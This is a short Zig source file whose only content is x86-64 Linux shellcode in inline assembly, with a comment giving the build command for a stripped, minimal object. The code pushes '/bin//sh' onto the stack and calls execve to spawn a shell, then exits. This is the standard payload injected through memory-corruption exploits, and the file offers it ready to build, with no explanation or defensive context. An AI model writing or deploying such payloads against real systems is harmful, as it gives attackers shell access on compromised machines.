// zig build-obj shellcode.zig -fno-entry -O ReleaseSmall -target x86_64-linux -fstrip

export fn shellcode() noreturn {
    asm volatile (
        \\  xor %rax, %rax
        \\  push %rax
        \\  mov $0x68732f2f6e69622f, %rbx
        \\  push %rbx
        \\  mov %rsp, %rdi
        \\  push %rax
        \\  push %rdi
        \\  mov %rsp, %rsi
        \\  xor %rdx, %rdx
        \\  mov $59, %al
        \\  syscall
        \\  mov $60, %al
        \\  xor %rdi, %rdi
        \\  syscall
    );
    
    while (true) {}
}
